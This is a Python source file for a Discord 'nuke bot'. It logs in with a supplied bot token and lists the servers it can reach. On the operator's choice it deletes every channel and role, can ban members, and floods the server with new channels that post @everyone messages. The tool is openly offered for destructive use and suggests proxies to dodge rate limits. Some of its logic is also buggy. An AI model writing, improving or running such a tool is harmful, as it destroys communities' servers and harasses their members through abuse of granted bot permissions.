import hikari, lightbulb, colorama, asyncio, sys

## --- // MENU \\ --

print(f"""{colorama.Fore.LIGHTCYAN_EX}

░░█ █░█ █▀ ▀█▀   ▄▀█ █▄░█ █▀█ ▀█▀ █░█ █▀▀ █▀█   █▀▀ █▀▀ █▄░█ █▀▀ █▀█ █ █▀▀   █▄░█ █░█ █▄▀ █▀▀   █▄▄ █▀█ ▀█▀
█▄█ █▄█ ▄█ ░█░   █▀█ █░▀█ █▄█ ░█░ █▀█ ██▄ █▀▄   █▄█ ██▄ █░▀█ ██▄ █▀▄ █ █▄▄   █░▀█ █▄█ █░█ ██▄   █▄█ █▄█ ░█░
      \n
""")

print(f"{colorama.Fore.LIGHTMAGENTA_EX}~~ just another generic nuke bot ~~ \n")
print(f"{colorama.Fore.LIGHTMAGENTA_EX}~~~ designed by thing that make world spin ~~~ \n")

print(f"{colorama.Fore.LIGHTMAGENTA_EX}~~~ recommended to use on a proxy to avoid ratelimits ~~~ \n")

print(f"{colorama.Fore.LIGHTBLUE_EX}~ input bot token >:")

settings = {}
other_info = {}

settings['bot_token'] = None
settings['number_of_channels'] = None
settings['ban_members'] = None 
settings['exclude_ids'] = None
settings['name'] = None
settings['custom_message'] = None

settings["bot_token"] = input("~> ")

print(f"{colorama.Fore.LIGHTBLUE_EX}~ input number of channels to create after nuke is completed, ex: 20, 100 (ratelimits might occur) >:")

settings["number_of_channels"] = int(input("~> "))


## // BAN MEMBERS CHOICE \\ 

print(f"{colorama.Fore.LIGHTBLUE_EX}~ should the nuke ban members? true/false")

settings["ban_members"] = input("~> ").lower()

convert = {
    "true": True,
    "false": False,
}

if convert[settings["ban_members"]]:
   settings["ban_members"] = convert[settings["ban_members"]]
else:
   settings["ban_members"] = False

if settings["ban_members"] == True:
  print(f"{colorama.Fore.LIGHTBLUE_EX}~ should the nuke exclude banning certain people? if so please add a user id below (leave blank if not, seperate multiple with a comma.)")
  exclude_users = input("~> ")
  entries = exclude_users.split(',')
  settings["exclude_ids"] = entries
   

print(f"{colorama.Fore.LIGHTBLUE_EX}~ input name of nuker, ex: beans, gamer. >:")

settings["name"]  = input("~> ")

print(f"{colorama.Fore.LIGHTBLUE_EX}~ input message that will be displayed after nuke is complete >:")

settings["custom_message"]  = input("~> ")


print("~~ please review your settings below... ~~\n")
## // MAKE CUSTOM SETTINGS TABLE \\ ##
##print(f"{str(settings)}\n")

print(f"""
⦃
      
 [bot token]: {settings['bot_token']}
 [number of channels]: {settings['number_of_channels']}
 [ban members]: {settings['ban_members']}
 [exclude_members]: {settings['exclude_ids']}
 [nuker name]: {settings['name']}
 [custom message]: {settings['custom_message']}

⦄

""")

### // END CUSTOM \\ #
print("~ respond with y/n to confirm or deny")
choice = input("~> ").lower()

if choice == "n":
 sys.exit()

print(f"{colorama.Fore.LIGHTMAGENTA_EX}~~ launching... pls wait ~~")


bot = lightbulb.BotApp(token=settings["bot_token"], prefix="./n", banner=None)


async def nuke_start(guild: hikari.Guild):
 ##channels = await ctx.bot.cache.get_guild_channels_view_for_guild(guild.id)
 channels = guild.get_channels()
 roles = await bot.rest.fetch_roles(guild)
 members = await bot.rest.fetch_members(guild)

 other_info["channels_to_destroy"] = len(channels)
 other_info["roles_to_destroy"] = len(roles)
 other_info["members_to_destroy"] = len(members)


 if len(channels) >= 50:
  print(f"{colorama.Fore.LIGHTMAGENTA_EX}~~ ratelimits might occur, server has more then or exactly 50 channels. ~~")\

 if len(roles) >= 50:
  print(f"{colorama.Fore.LIGHTMAGENTA_EX}~~ ratelimits might occur, server has more then or exactly 50 roles. ~~")

 print(f"{colorama.Fore.RED}~~ KABOOOOOOM!!!! ~~")

 print(f"""
        ,--.!,
     __/   -*-
   ,d08b.  '|`
   0088MM     
   `9MMP'     
   """)
 
 count = 0
 for channel_id in channels:
  count = count + 1
  try:
   channel = await bot.rest.fetch_channel(channel_id)
   await bot.rest.delete_channel(channel)
   print(f"~ [OK] deleted channel: #{channel.name}, {channel.id} [{count}/{other_info['channels_to_destroy']}]")
  except:
   print(f"~ [FAIL] unable to delete channel: #{channel.name}, {channel.id}")

 count = 0
 for role in roles:
  count = count + 1
  try:
   await bot.rest.delete_role(guild, role)
   print(f"~ [OK] deleted role {role.name}, {role.id} [{count}/{other_info['roles_to_destroy']}]")
  except:
   print(f"~ [FAIL] unable to delete role {role.name}, {role.id}")

 if settings["ban_members"] == True:
  count = 0
  for member in members:
   count = count + 1
   try:
    if not settings["exclude_ids"][member.id]:
     await bot.rest.ban_member(member, reason=f"~ nuked by {settings['name']}")
     print(f"~ [OK] banished member {member.id} [{count}/{other_info['members_to_destroy']}")
   except:
    print(f"~ [FAIL] unable to banish member {member.id}")

 # // attempt to create new channels  \\ 
 current_created = 0

 while current_created < int(settings['number_of_channels']):
  current_created = current_created + 1


  channel = await bot.rest.create_guild_text_channel(guild, name=f"nuked by {settings['name']}")
  await bot.rest.create_message(channel, f"@everyone {settings['custom_message']}")

  print(f"{colorama.Fore.LIGHTBLUE_EX}~ [OK] sucesfully created channel: {channel.name}, {channel.id} [{current_created}/{settings['number_of_channels']}]")
 
 print(f"{colorama.Fore.LIGHTMAGENTA_EX}~ [FINALIZED] sucesfully nuked {guild.name}, {guild.id} ~")
 print(f"{colorama.Fore.LIGHTMAGENTA_EX}~ [AWAIT] terminating program in 5-mississippi ~")
 await asyncio.sleep(5)
 print(f"{colorama.Fore.LIGHTMAGENTA_EX}~ [FINALIZED] terminated program")
 await asyncio.sleep(1)
 await bot.close()


### // FIRST START \\ ###

@bot.listen(hikari.StartedEvent)
async def on_login(ctx: hikari.StartedEvent):
 await asyncio.sleep(4)

 print(f"{colorama.Fore.LIGHTBLUE_EX}~~ sucesfully logged into discord, with token: {settings['bot_token']}")

 guilds = bot.cache.get_available_guilds_view()
 guilds_available = []

 for guild in guilds:
  guilds_available.append(guild)

 print(f"{colorama.Fore.LIGHTMAGENTA_EX}~~ servers available. ~~")
 count = 0

 guilds_numbered = {}

 for guild in guilds_available:
  count = count + 1

  server_info = bot.cache.get_available_guild(guild)

  guilds_numbered[count] = server_info

  print(f"[{count}] {server_info.name}, {server_info.id}")
 
 print(f"{colorama.Fore.LIGHTBLUE_EX}~ input the server to nuke >:")
 server_to_nuke = input("~> ")

 if guilds_numbered[int(server_to_nuke)]:
  print(f"{colorama.Fore.RED}~~ setting up the bombs :3 ~~")
  await nuke_start(guilds_numbered[int(server_to_nuke)])
 else:
  print(f"{colorama.Fore.RED}~ the entry that was input is invalid, try again.")
  return 




bot.run()